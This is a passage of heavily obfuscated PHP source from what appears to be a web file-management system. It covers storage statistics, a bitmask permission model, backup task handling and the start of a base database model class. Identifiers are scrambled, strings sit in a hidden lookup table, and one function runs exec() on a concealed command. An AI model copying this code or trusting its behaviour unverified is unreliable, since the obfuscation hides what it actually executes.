$FÔ––ÂâãÜ[2024] => (int) $AâˆÙÙé†Õ, $FÔ––ÂâãÜ[2025] => (int) $b°«í‡ŞŠã, $FÔ––ÂâãÜ[2026] => $Eø†µç‚˜æ); goto cùª‚¼è”¤; d“ÎˆÀÊ¹: if (!$Eø†µç‚˜æ) { $Eø†µç‚˜æ = 1; } $bğ»Û¸Å…Ù = strtotime(date($FÔ––ÂâãÜ[2001])); $Fì’¾¿†˜¥ = array($FÔ––ÂâãÜ[2022] => array($FÔ––ÂâãÜ[915], $bğ»Û¸Å…Ù)); goto e÷Š²¥‘é²; cùª‚¼è”¤: } private function optionFile() { goto Aß™˜àÛŸ; BÅ™‰Ñí¤ğ: $E‡åœÑÇŒé = $F¾ì’‡ß¡…[$Cß–ßÀÜãò[1994]]; $a„ñ°›î‹¼ = Model($Cß–ßÀÜãò[746])->where(array($Cß–ßÀÜãò[375] => 0))->count($Cß–ßÀÜãò[374]); $ağ‘àŒµ” = array($Cß–ßÀÜãò[375] => 0, $Cß–ßÀÜãò[183] => array($Cß–ßÀÜãò[915], strtotime(date($Cß–ßÀÜãò[2001])))); goto c±«ˆ ’ÀÅ; c±«ˆ ’ÀÅ: $DŠ‚õ‚½ß = Model($Cß–ßÀÜãò[746])->where($ağ‘àŒµ”)->sum($Cß–ßÀÜãò[77]); $bËÊ ½õÚ = Model($Cß–ßÀÜãò[746])->where($ağ‘àŒµ”)->count($Cß–ßÀÜãò[374]); return array($Cß–ßÀÜãò[692] => $D‘“Œ˜ÆœÔ, $Cß–ßÀÜãò[1994] => $E‡åœÑÇŒé, $Cß–ßÀÜãò[2027] => $D‘“Œ˜ÆœÔ - $E‡åœÑÇŒé, $Cß–ßÀÜãò[2028] => (int) $DŠ‚õ‚½ß, $Cß–ßÀÜãò[694] => (int) $a„ñ°›î‹¼, $Cß–ßÀÜãò[2029] => (int) $bËÊ ½õÚ); goto fâ‘£Ÿì; Aß™˜àÛŸ: $Cß–ßÀÜãò =& $_SERVER[Ä¿Ş°¨]; $F¾ì’‡ß¡… = $this->sourceSize(); $D‘“Œ˜ÆœÔ = $F¾ì’‡ß¡…[$Cß–ßÀÜãò[77]]; goto BÅ™‰Ñí¤ğ; fâ‘£Ÿì: } private function optionAccess() { $cµİ­Éç½ =& $_SERVER[Ä¿Ş°¨]; return array($cµİ­Éç½[689] => $this->typeLogCnt(), $cµİ­Éç½[102] => $this->typeLogCnt($cµİ­Éç½[102]), $cµİ­Éç½[408] => $this->typeLogCnt($cµİ­Éç½[408]), $cµİ­Éç½[2030] => $this->typeLogCnt($cµİ­Éç½[2030]), $cµİ­Éç½[2031] => $this->typeLogCnt($cµİ­Éç½[2031]), $cµİ­Éç½[539] => $this->typeLogCnt($cµİ­Éç½[33], $cµİ­Éç½[2005])); } private function typeLogCnt($c«Ì¾†ï¦ó = '', $EŒ½ÏíˆÄ‡ = "\x69\144") { goto eÒ…Öñàª; BºÓ‹¡¬Ù: return (int) $fÄìˆø›; goto B²©…ÓÀ; fîËæ”ŠÓ: $eßâ¼õšà = array($B³Ñ–ßà±â[183] => array($B³Ñ–ßà±â[915], $EÀ†—´Çƒ)); if ($c«Ì¾†ï¦ó) { $eßâ¼õšà[$B³Ñ–ßà±â[29]] = array($B³Ñ–ßà±â[7], $FÜ®ã¶¥Ö­[$c«Ì¾†ï¦ó]); } $fÄìˆø› = Model($B³Ñ–ßà±â[2004])->where($eßâ¼õšà)->count($EŒ½ÏíˆÄ‡); goto BºÓ‹¡¬Ù; eÒ…Öñàª: $B³Ñ–ßà±â =& $_SERVER[Ä¿Ş°¨]; $FÜ®ã¶¥Ö­ = array($B³Ñ–ßà±â[102] => array($B³Ñ–ßà±â[2032], $B³Ñ–ßà±â[2033]), $B³Ñ–ßà±â[408] => array($B³Ñ–ßà±â[2034], $B³Ñ–ßà±â[2035]), $B³Ñ–ßà±â[2030] => array($B³Ñ–ßà±â[2036], $B³Ñ–ßà±â[2037]), $B³Ñ–ßà±â[2031] => array($B³Ñ–ßà±â[2038], $B³Ñ–ßà±â[2039]), $B³Ñ–ßà±â[2040] => array($B³Ñ–ßà±â[2041], $B³Ñ–ßà±â[2042], $B³Ñ–ßà±â[2043])); $EÀ†—´Çƒ = strtotime(date($B³Ñ–ßà±â[2001])); goto fîËæ”ŠÓ; B²©…ÓÀ: } private function optionServer() { goto Eª¡ù ƒ‰ê; FÄİæÌ´ñª: if ($D…Ş±™³å¹ == $b·„ÃÄ×Úø[718]) { $BäˆÈğ…Ï = explode($b·„ÃÄ×Úø[1061], $a÷Ê…òµ”ß[$b·„ÃÄ×Úø[874]]); $D…Ş±™³å¹ = $BäˆÈğ…Ï[0]; } if ($D…Ş±™³å¹ == $b·„ÃÄ×Úø[721] || $D…Ş±™³å¹ == $b·„ÃÄ×Úø[722]) { $cÌœçêİè = Model()->db()->query($b·„ÃÄ×Úø[2044]); $D‹Ñ§³ĞËÅ = $cÌœçêİè[0] && isset($cÌœçêİè[0][$b·„ÃÄ×Úø[1303]]) ? $cÌœçêİè[0][$b·„ÃÄ×Úø[1303]] : 0; $D…Ş±™³å¹ = $b·„ÃÄ×Úø[2045] . ($D‹Ñ§³ĞËÅ ? $b·„ÃÄ×Úø[8] . $D‹Ñ§³ĞËÅ : $b·„ÃÄ×Úø[33]); } $dŒ•Ş†ã¡« = $GLOBALS[$b·„ÃÄ×Úø[6]][$b·„ÃÄ×Úø[333]][$b·„ÃÄ×Úø[747]]; goto cø±âå¤¹¶; b„¾ª÷¼œÉ: $F Ş¼²‡‘ğ = array($b·„ÃÄ×Úø[737] => $D²Ç­¥ù¢[$b·„ÃÄ×Úø[372]]); $FÔñŞÉö»‚ = Model($b·„ÃÄ×Úø[426])->where($F Ş¼²‡‘ğ)->sum($b·„ÃÄ×Úø[77]); $A‰ˆÒË¿ = explode($b·„ÃÄ×Úø[50], $_SERVER[$b·„ÃÄ×Úø[137]]); goto CĞÛìàŒèÖ; cø±âå¤¹¶: return array($b·„ÃÄ×Úø[2046] => $b‹‚ÜÉ¦ ? $b‹‚ÜÉ¦[$b·„ÃÄ×Úø[2047]] : 0, $b·„ÃÄ×Úø[2048] => $b‹‚ÜÉ¦ ? $b‹‚ÜÉ¦[$b·„ÃÄ×Úø[2049]] : 0, $b·„ÃÄ×Úø[2050] => (int) $D²Ç­¥ù¢[$b·„ÃÄ×Úø[2047]] * 1024 * 1024 * 1024, $b·„ÃÄ×Úø[2051] => (int) $FÔñŞÉö»‚, $b·„ÃÄ×Úø[2052] => ucfirst($Có˜ ¢Ú©), $b·„ÃÄ×Úø[2053] => $b·„ÃÄ×Úø[2054] . PHP_VERSION, $b·„ÃÄ×Úø[2055] => phpBuild64() ? 64 : 32, $b·„ÃÄ×Úø[688] => str_replace($b·„ÃÄ×Úø[2056], $b·„ÃÄ×Úø[891], $D…Ş±™³å¹), $b·„ÃÄ×Úø[333] => ucfirst($dŒ•Ş†ã¡«), $b·„ÃÄ×Úø[28] => $_SERVER[$b·„ÃÄ×Úø[2057]]); goto cãâ·ù¶; CĞÛìàŒèÖ: $Có˜ ¢Ú© = $A‰ˆÒË¿[0]; $a÷Ê…òµ”ß = $GLOBALS[$b·„ÃÄ×Úø[6]][$b·„ÃÄ×Úø[17]]; $D…Ş±™³å¹ = $a÷Ê…òµ”ß[$b·„ÃÄ×Úø[875]]; goto FÄİæÌ´ñª; Eª¡ù ƒ‰ê: $b·„ÃÄ×Úø =& $_SERVER[Ä¿Ş°¨]; $b‹‚ÜÉ¦ = $this->diskDriver(); $D²Ç­¥ù¢ = KodIO::defaultDriver(); goto b„¾ª÷¼œÉ; cãâ·ù¶: } private function diskDriver() { goto dÊ‘ƒÛêéò; dÊ‘ƒÛêéò: $dôšØœâŠ =& $_SERVER[Ä¿Ş°¨]; $f«¨áÒ¯® = $dôšØœâŠ[8]; $f¦‘³­®½¦ = $GLOBALS[$dôšØœâŠ[6]][$dôšØœâŠ[2058]] == $dôšØœâŠ[2059]; goto bÜÏ’·ö ’; bÜÏ’·ö ’: if ($f¦‘³­®½¦) { $f«¨áÒ¯® = $dôšØœâŠ[2060]; if (function_exists($dôšØœâŠ[2061])) { exec($dôšØœâŠ[2062], $eƒÂ“¡™«Ú); $f«¨áÒ¯® = $eƒÂ“¡™«Ú[1] . $dôšØœâŠ[8]; } } if (!file_exists($f«¨áÒ¯®)) { return; } $f©¦õÅ¯’Ö = @disk_total_space($f«¨áÒ¯®); goto eŠôÀøÖ†İ; eŠôÀøÖ†İ: $b°êá‰™‚ = $f©¦õÅ¯’Ö - @disk_free_space($f«¨áÒ¯®); return array($dôšØœâŠ[2047] => $f©¦õÅ¯’Ö, $dôšØœâŠ[2049] => $b°êá‰™‚); goto aŸÀ‹‘ãçÒ; aŸÀ‹‘ãçÒ: } public function fileChart($b¨“»Æš‹É) { goto b‚µÍ¶ÎèÏ; Eï¦ÈÓæÊƒ: $bôé‰Ö†¬º[$E‰ØˆŞ£¹[376]] = 2; $A‰·°à ùá = Model($E‰ØˆŞ£¹[746])->where($bôé‰Ö†¬º)->sum($E‰ØˆŞ£¹[77]); return array($E‰ØˆŞ£¹[692] => $d‘³–¥Õ[$E‰ØˆŞ£¹[77]], $E‰ØˆŞ£¹[1994] => $d‘³–¥Õ[$E‰ØˆŞ£¹[1994]], $E‰ØˆŞ£¹[1995] => (int) $a®¡Óì¤é‡, $E‰ØˆŞ£¹[1996] => (int) $A‰·°à ùá); goto eÄœ®ËŠÉä; b‚µÍ¶ÎèÏ: $E‰ØˆŞ£¹ =& $_SERVER[Ä¿Ş°¨]; if (isset($b¨“»Æš‹É[$E‰ØˆŞ£¹[1399]])) { return Model($E‰ØˆŞ£¹[746])->userFileTypeProfile($b¨“»Æš‹É[$E‰ØˆŞ£¹[1399]]); } if (isset($b¨“»Æš‹É[$E‰ØˆŞ£¹[2063]])) { return Model($E‰ØˆŞ£¹[746])->groupFileTypeProfile($b¨“»Æš‹É[$E‰ØˆŞ£¹[2063]]); } goto dÙêÓ»±¶; dÙêÓ»±¶: $d‘³–¥Õ = $this->sourceSize(); $bôé‰Ö†¬º = array($E‰ØˆŞ£¹[465] => 0, $E‰ØˆŞ£¹[376] => 1); $a®¡Óì¤é‡ = Model($E‰ØˆŞ£¹[746])->where($bôé‰Ö†¬º)->sum($E‰ØˆŞ£¹[77]); goto Eï¦ÈÓæÊƒ; eÄœ®ËŠÉä: } private function sourceSize() { $Aö¾ù«Ğ¬™ =& $_SERVER[Ä¿Ş°¨]; $Då˜¯‰ï„” = Model($Aö¾ù«Ğ¬™[746])->where(array($Aö¾ù«Ğ¬™[375] => 0))->sum($Aö¾ù«Ğ¬™[77]); $DÇÕ­¼“Â = Model($Aö¾ù«Ğ¬™[426])->sum($Aö¾ù«Ğ¬™[77]); if ($DÇÕ­¼“Â > $Då˜¯‰ï„”) { $DÇÕ­¼“Â = $Då˜¯‰ï„”; } return array($Aö¾ù«Ğ¬™[77] => (int) $Då˜¯‰ï„”, $Aö¾ù«Ğ¬™[1994] => (int) $DÇÕ­¼“Â); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $cÓŒÊ‹Ã“Ì =& $_SERVER[Ä¿Ş°¨]; $aÌ”ÆŒéÓ¾ = array(array($cÓŒÊ‹Ã“Ì[391] => LNG($cÓŒÊ‹Ã“Ì[2064]), $cÓŒÊ‹Ã“Ì[2065] => $cÓŒÊ‹Ã“Ì[2066], $cÓŒÊ‹Ã“Ì[2067] => 6, $cÓŒÊ‹Ã“Ì[2068] => 1, $cÓŒÊ‹Ã“Ì[2069] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($cÓŒÊ‹Ã“Ì[391] => LNG($cÓŒÊ‹Ã“Ì[2070]), $cÓŒÊ‹Ã“Ì[2065] => $cÓŒÊ‹Ã“Ì[2071], $cÓŒÊ‹Ã“Ì[2067] => 1, $cÓŒÊ‹Ã“Ì[2068] => 1, $cÓŒÊ‹Ã“Ì[2069] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($cÓŒÊ‹Ã“Ì[391] => LNG($cÓŒÊ‹Ã“Ì[2072]), $cÓŒÊ‹Ã“Ì[2065] => $cÓŒÊ‹Ã“Ì[2073], $cÓŒÊ‹Ã“Ì[2067] => 2, $cÓŒÊ‹Ã“Ì[2068] => 1, $cÓŒÊ‹Ã“Ì[2069] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($cÓŒÊ‹Ã“Ì[391] => LNG($cÓŒÊ‹Ã“Ì[2074]), $cÓŒÊ‹Ã“Ì[2065] => $cÓŒÊ‹Ã“Ì[2073], $cÓŒÊ‹Ã“Ì[2067] => 3, $cÓŒÊ‹Ã“Ì[2068] => 1, $cÓŒÊ‹Ã“Ì[2069] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($cÓŒÊ‹Ã“Ì[391] => LNG($cÓŒÊ‹Ã“Ì[2075]), $cÓŒÊ‹Ã“Ì[2065] => $cÓŒÊ‹Ã“Ì[2076], $cÓŒÊ‹Ã“Ì[2067] => 4, $cÓŒÊ‹Ã“Ì[2068] => 1, $cÓŒÊ‹Ã“Ì[2069] => self::AUTH_SHOW | self::AUTH_VIEW), array($cÓŒÊ‹Ã“Ì[391] => LNG($cÓŒÊ‹Ã“Ì[2077]), $cÓŒÊ‹Ã“Ì[2065] => $cÓŒÊ‹Ã“Ì[2078], $cÓŒÊ‹Ã“Ì[2067] => 5, $cÓŒÊ‹Ã“Ì[2068] => 1, $cÓŒÊ‹Ã“Ì[2069] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($cÓŒÊ‹Ã“Ì[391] => LNG($cÓŒÊ‹Ã“Ì[2079]), $cÓŒÊ‹Ã“Ì[2065] => $cÓŒÊ‹Ã“Ì[2080], $cÓŒÊ‹Ã“Ì[2067] => 7, $cÓŒÊ‹Ã“Ì[2068] => 1, $cÓŒÊ‹Ã“Ì[2069] => 0)); return $aÌ”ÆŒéÓ¾; } public static function authCheck($A¾„Òâí, $Dù”á°ÓŒ) { $A¾„Òâí = intval($A¾„Òâí); if (_get($GLOBALS, $_SERVER[Ä¿Ş°¨][461])) { return !0; } if ($A¾„Òâí <= 0) { return !1; } if (($A¾„Òâí & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($A¾„Òâí & $Dù”á°ÓŒ); } public static function authCheckShow($fíÔ£ÃÅµÁ) { return self::authCheck($fíÔ£ÃÅµÁ, self::AUTH_SHOW); } public static function authCheckView($dŒÔÙ¾è™–) { return self::authCheck($dŒÔÙ¾è™–, self::AUTH_VIEW); } public static function authCheckDownload($F¿×¸Ë—ÕÙ) { return self::authCheck($F¿×¸Ë—ÕÙ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($dåñŞ“ÂŞŒ) { return self::authCheck($dåñŞ“ÂŞŒ, self::AUTH_UPLOAD); } public static function authCheckEdit($EæîäâµØ) { return self::authCheck($EæîäâµØ, self::AUTH_EDIT); } public static function authCheckRemove($A„ñÅù‘É) { return self::authCheck($A„ñÅù‘É, self::AUTH_REMOVE); } public static function authCheckShare($Fº«àšå·) { return self::authCheck($Fº«àšå·, self::AUTH_SHARE); } public static function authCheckComment($F˜¿çä„‹·) { return self::authCheck($F˜¿çä„‹·, self::AUTH_COMMENT); } public static function authCheckEvent($B×–´Ù­) { return self::authCheck($B×–´Ù­, self::AUTH_EVENT); } public static function authCheckRoot($a¼óÖ¯×ô×) { return self::authCheck($a¼óÖ¯×ô×, self::AUTH_ROOT); } public static function authDisable($cŞê‰É¹²ß, $A´íÈ˜¼¤) { if (intval($cŞê‰É¹²ß) <= 0) { return 0; } return intval($cŞê‰É¹²ß) & ~$A´íÈ˜¼¤; } public $optionType = "\123\x79\163\x74\x65\155\56\x73\x6f\165\x72\143\145\101\165\x74\x68\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\141\x75\164\150", "\154\x61\142\x65\x6c", "\x64\151\163\160\x6c\x61\171", "\163\x79\163\164\145\x6d", "\163\x6f\162\164"); public function initData() { $FÎ´„ùĞí = $this->authDefault(); foreach ($FÎ´„ùĞí as $BÑŒ§Œ”­‚) { $this->add($BÑŒ§Œ”­‚); } } public function listData($dô¼ø®­ßÍ = false, $C·°ÙŸõ‹• = "\163\x6f\162\x74", $DÎÓò‘Ëï = false) { return parent::listData($dô¼ø®­ßÍ, $C·°ÙŸõ‹•, $DÎÓò‘Ëï); } public function update($e“àƒŒÖŠ’, $C‘‚¢ÖêŠ ) { $b‘î¶š“Öæ =& $_SERVER[Ä¿Ş°¨]; $e…Òèáæ²Œ = parent::listData($e“àƒŒÖŠ’); $D”šË¥¸ = $this->findByName($C‘‚¢ÖêŠ [$b‘î¶š“Öæ[28]]); if (!$e…Òèáæ²Œ || $D”šË¥¸ && $D”šË¥¸[$b‘î¶š“Öæ[372]] != $e…Òèáæ²Œ[$b‘î¶š“Öæ[372]]) { return !1; } $this->filterAuth($C‘‚¢ÖêŠ [$b‘î¶š“Öæ[381]]); return parent::update($e“àƒŒÖŠ’, $C‘‚¢ÖêŠ ); } public function remove($c±£ˆˆ½É‰) { $Eî’¿Á–÷ï = parent::listData($c±£ˆˆ½É‰); if (!$Eî’¿Á–÷ï || $Eî’¿Á–÷ï[$_SERVER[Ä¿Ş°¨][1065]]) { return !1; } return parent::remove($c±£ˆˆ½É‰); } public function add($fÖºâøÛ± = array()) { goto CÚñÈŒ…«ê; CÚñÈŒ…«ê: $føà±£™Ï‚ =& $_SERVER[Ä¿Ş°¨]; if ($this->findByName($fÖºâøÛ±[$føà±£™Ï‚[28]])) { return !1; } $EŞ–¬ˆÄ = array($føà±£™Ï‚[28] => $føà±£™Ï‚[33], $føà±£™Ï‚[381] => 1, $føà±£™Ï‚[2081] => $føà±£™Ï‚[2082], $føà±£™Ï‚[2083] => 1, $føà±£™Ï‚[1065] => 0, $føà±£™Ï‚[2084] => 0); goto F–ĞôÖ‰Ú”; F–ĞôÖ‰Ú”: $fÖºâøÛ± = array_merge($EŞ–¬ˆÄ, $fÖºâøÛ±); $fÖºâøÛ±[$føà±£™Ï‚[2084]] = $this->getSort(); $this->filterAuth($fÖºâøÛ±[$føà±£™Ï‚[381]]); goto BÚ˜¦ô¶; BÚ˜¦ô¶: return parent::insert($fÖºâøÛ±); goto c«šÉŒ ùø; c«šÉŒ ùø: } private function getSort() { $FƒâÃÂŒöĞ =& $_SERVER[Ä¿Ş°¨]; $EÁ²£Ù®Ïˆ = parent::listData(); $cê„Òæ²¡ = array_to_keyvalue($EÁ²£Ù®Ïˆ, $FƒâÃÂŒöĞ[33], $FƒâÃÂŒöĞ[2084]); return empty($cê„Òæ²¡) ? 0 : max($cê„Òæ²¡) + 1; } private function filterAuth(&$aÀÁµÙâæ) { goto E“ÜëÑÅå; a­ˆóñ¾ÎÔ: foreach ($CÒè…¨÷à as $cªèß„Ñ‹) { if ($aÀÁµÙâæ & $cªèß„Ñ‹) { $fÒ¨÷îêÌ¥[] = $cªèß„Ñ‹; } } if (in_array(self::AUTH_ROOT, $fÒ¨÷îêÌ¥)) { $aÀÁµÙâæ = array_sum($CÒè…¨÷à); return; } $Bõ´”ø»Ç¬ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto a í²¢—”‡; a í²¢—”‡: foreach ($fÒ¨÷îêÌ¥ as $cªèß„Ñ‹) { if (isset($Bõ´”ø»Ç¬[$cªèß„Ñ‹])) { $fÒ¨÷îêÌ¥ = array_merge($fÒ¨÷îêÌ¥, $Bõ´”ø»Ç¬[$cªèß„Ñ‹]); } } $fÒ¨÷îêÌ¥[] = self::AUTH_SHOW; $aÀÁµÙâæ = array_sum(array_unique($fÒ¨÷îêÌ¥)); goto dÃ„ãèğßÕ; E“ÜëÑÅå: if (!$aÀÁµÙâæ) { return; } $CÒè…¨÷à = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $fÒ¨÷îêÌ¥ = array(); goto a­ˆóñ¾ÎÔ; dÃ„ãèğßÕ: } public function sort($Bğî£…ô‘à, $Dë´òáŒ’Ç) { return parent::update($Bğî£…ô‘à, $Dë´òáŒ’Ç); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\x62\x61\143\153\x75\x70\114\151\x73\x74"; public $field = array("\x69\x6f", "\156\x61\x6d\x65", "\163\164\x61\164\165\x73", "\x63\157\x6e\x74\145\156\x74", "\162\x65\163\x75\154\164", "\x74\x69\x6d\x65\106\x72\157\x6d", "\164\x69\x6d\x65\124\157"); public function config() { goto Eòà¯§ÙÇ­; cÜäï²‹æ: Action($dÎ‚ÛÛ[2085])->taskInit(); $f„¤®ÂêÕõ = Model($dÎ‚ÛÛ[2086])->listData(); foreach ($f„¤®ÂêÕõ as $E·¾‹ñÓ†´) { if ($E·¾‹ñÓ†´[$dÎ‚ÛÛ[1065]] == $dÎ‚ÛÛ[83] && $E·¾‹ñÓ†´[$dÎ‚ÛÛ[1387]] == $dÎ‚ÛÛ[2087]) { $bÅäù¦Ï = $E·¾‹ñÓ†´; break; } } goto D¼øÃ“Âğ¶; cÉšªÎÂ¨è: $a…¾ ›º‚· = is_array($a…¾ ›º‚·) ? $a…¾ ›º‚· : array(); if (!isset($a…¾ ›º‚·[$dÎ‚ÛÛ[686]])) { $a…¾ ›º‚·[$dÎ‚ÛÛ[686]] = $dÎ‚ÛÛ[472]; } $bÅäù¦Ï = array(); goto cÜäï²‹æ; D¼øÃ“Âğ¶: if (isset($bÅäù¦Ï[$dÎ‚ÛÛ[186]])) { $bÅäù¦Ï[$dÎ‚ÛÛ[186]] = json_decode($bÅäù¦Ï[$dÎ‚ÛÛ[186]], !0); } if (isset($a…¾ ›º‚·[$dÎ‚ÛÛ[186]])) { $bÅäù¦Ï[$dÎ‚ÛÛ[186]][$dÎ‚ÛÛ[1374]] = $a…¾ ›º‚·[$dÎ‚ÛÛ[186]]; unset($a…¾ ›º‚·[$dÎ‚ÛÛ[186]]); } return array_merge($bÅäù¦Ï, $a…¾ ›º‚·); goto fËˆ¾öˆë; Eòà¯§ÙÇ­: $dÎ‚ÛÛ =& $_SERVER[Ä¿Ş°¨]; $a…¾ ›º‚· = Model($dÎ‚ÛÛ[1073])->get($dÎ‚ÛÛ[706]); $a…¾ ›º‚· = json_decode($a…¾ ›º‚·, !0); goto cÉšªÎÂ¨è; fËˆ¾öˆë: } public function listData($bïî°ğ‚¿Ç = false, $e¢‹Ğ¼¾Ó• = "\x6d\157\144\151\146\171\x54\x69\x6d\145", $C©é†©Ê² = false) { return parent::listData($bïî°ğ‚¿Ç, $e¢‹Ğ¼¾Ó•, !0); } public function lastItem() { $c¼Ï¢¶÷ïğ = $this->listData(); return !empty($c¼Ï¢¶÷ïğ[0]) ? $c¼Ï¢¶÷ïğ[0] : null; } public function kill($c¨ØŸí«å) { goto aÑ˜®‡ôÕŒ; cÉì¾´ôÕÄ: return $this->remove($c¨ØŸí«å); goto eô‰Ê†‘…‰; E¼êŒ¼¨Æé: Task::kill($E»¸ôŠÀ…É[705]); Task::kill($E»¸ôŠÀ…É[723]); Task::kill($E»¸ôŠÀ…É[730]); goto d£éÔµğ‹ö; d£éÔµğ‹ö: $EŒàĞÖ¤ç = $bõ´õˆÂˆæ[$E»¸ôŠÀ…É[28]]; $DÁ°œŸãé• = TEMP_FILES . $E»¸ôŠÀ…É[704] . $EŒàĞÖ¤ç . $E»¸ôŠÀ…É[8]; IO::remove($DÁ°œŸãé•, !1); goto cÉì¾´ôÕÄ; aÑ˜®‡ôÕŒ: $E»¸ôŠÀ…É =& $_SERVER[Ä¿Ş°¨]; $bõ´õˆÂˆæ = $this->listData($c¨ØŸí«å); if (!$bõ´õˆÂˆæ || empty($bõ´õˆÂˆæ[$E»¸ôŠÀ…É[28]])) { return !0; } goto E¼êŒ¼¨Æé; eô‰Ê†‘…‰: } public function remove($fÁÄÖ‹õ‡ğ) { $A²–¨¯–œ› = $this->listData($fÁÄÖ‹õ‡ğ); if (!$A²–¨¯–œ›) { return !0; } return $this->backupRemove($A²–¨¯–œ›); } private function backupRemove($F‰ôÊ’Ş×) { $BÜ«›ËÇ³ =& $_SERVER[Ä¿Ş°¨]; parent::remove($F‰ôÊ’Ş×[$BÜ«›ËÇ³[372]]); $BÉô¶•—›è = "\x7b\151\157\72{$F‰ôÊ’Ş×[$BÜ«›ËÇ³[685]]}\175\x2f\144\x61\164\x61\142\141\x73\x65\57\142\x61\143\153\x75\x70\x5f" . $F‰ôÊ’Ş×[$BÜ«›ËÇ³[28]]; IO::remove($BÉô¶•—›è, !1); return !0; } public function start() { goto EÅÎ·¼²¬ò; b½‚››Š…›: if (!$E¶À‚Ñ‡¢ || $E¶À‚Ñ‡¢[$DùÏèÑ¤Ëá[1371]] != $DùÏèÑ¤Ëá[83]) { return !1; } $C†ôÖÜ˜ó§ = $this->process(); foreach ($C†ôÖÜ˜ó§ as $AÈìÏ°²¾) { if ($AÈìÏ°²¾) { return Task::restart($AÈìÏ°²¾[$DùÏèÑ¤Ëá[372]]); } } goto A¾ºùŞíç›; EÅÎ·¼²¬ò: $DùÏèÑ¤Ëá =& $_SERVER[Ä¿Ş°¨]; if ($GLOBALS[$DùÏèÑ¤Ëá[6]][$DùÏèÑ¤Ëá[84]][$DùÏèÑ¤Ëá[2088]] != $DùÏèÑ¤Ëá[83]) { return !0; } $E¶À‚Ñ‡¢ = $this->config(); goto b½‚››Š…›; A¾ºùŞíç›: $bÚÃèê¢ÌÅ = new Backup(); $bÚÃèê¢ÌÅ->keep(); if (!$bÚÃèê¢ÌÅ->db()) { return !1; } goto CÌ‡®¢Ğ˜Œ; cç²¿Ë³•: return !0; goto eŸ°·ÚŠ; CÌ‡®¢Ğ˜Œ: if (!$bÚÃèê¢ÌÅ->dbFile()) { return !1; } if ($E¶À‚Ñ‡¢[$DùÏèÑ¤Ëá[686]] == $DùÏèÑ¤Ëá[472]) { $bÚÃèê¢ÌÅ->file(); } Backup::set(array($DùÏèÑ¤Ëá[683] => 1, $DùÏèÑ¤Ëá[697] => time())); goto cç²¿Ë³•; eŸ°·ÚŠ: } public function process() { $FÍƒÆÇÓÊ =& $_SERVER[Ä¿Ş°¨]; return array($FÍƒÆÇÓÊ[688] => Task::get($FÍƒÆÇÓÊ[705]), $FÍƒÆÇÓÊ[691] => Task::get($FÍƒÆÇÓÊ[723]), $FÍƒÆÇÓÊ[163] => Task::get($FÍƒÆÇÓÊ[730])); } public function restore() { $DÀëÄõ¨ëø =& $_SERVER[Ä¿Ş°¨]; ActionCall($DÀëÄõ¨ëø[2089], !0, 1); ActionCall($DÀëÄõ¨ëø[2089], !0, 0); } } goto E”§¨—«ÎÖ; C›øõò·°: define($_SERVER[Ä¿Ş°¨][226], 0); define($_SERVER[Ä¿Ş°¨][227], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\145", "\157\162\144\x65\162", "\x61\x6c\151\141\x73", "\150\141\x76\x69\156\x67", "\x67\x72\157\165\x70", "\154\157\x63\x6b", "\144\151\x73\164\151\156\143\164", "\x61\x75\164\157", "\146\151\x6c\x74\x65\x72", "\166\x61\154\151\x64\x61\x74\145", "\x72\145\163\165\154\164", "\x62\151\x6e\x64", "\x74\157\153\145\x6e"); public function __construct($bÇˆ•¨Š¸ = '', $bÌÁ—óÈ·Œ = '', $b³‰Ç¡‘È¸ = '') { $FÆÇÑŠˆŒ =& $_SERVER[Ä¿Ş°¨]; $this->_initialize(); if (!empty($bÇˆ•¨Š¸)) { if (strpos($bÇˆ•¨Š¸, $FÆÇÑŠˆŒ[91])) { list($this->dbName, $this->name) = explode($FÆÇÑŠˆŒ[91], $bÇˆ•¨Š¸); } else { $this->name = $bÇˆ•¨Š¸; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($bÌÁ—óÈ·Œ)) { $this->tablePrefix = $FÆÇÑŠˆŒ[33]; } elseif ($FÆÇÑŠˆŒ[33] != $bÌÁ—óÈ·Œ) { $this->tablePrefix = $bÌÁ—óÈ·Œ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : 